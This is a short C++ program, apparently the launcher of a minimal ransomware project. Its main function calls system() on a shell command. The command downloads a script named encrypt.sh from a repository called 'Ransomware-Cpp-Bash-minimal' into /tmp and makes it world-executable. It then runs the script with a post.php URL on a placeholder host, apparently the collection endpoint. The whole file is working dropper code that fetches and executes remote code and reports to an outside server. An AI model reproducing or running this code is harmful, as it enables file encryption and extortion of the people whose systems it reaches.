#include <cstdlib> 
#include <string>

using namespace std;

int main()
{
	string cmd = "cd /tmp && wget -O /tmp/encrypt.sh https://raw.githubusercontent.com/drigg3r/Ransomware-Cpp-Bash-minimal/master/encrypt.sh > /dev/null 2>&1 && chmod 777 /tmp/encrypt.sh && ./encrypt.sh http://yoursite.com/post.php";
	system(cmd.c_str());
	return 0;
}
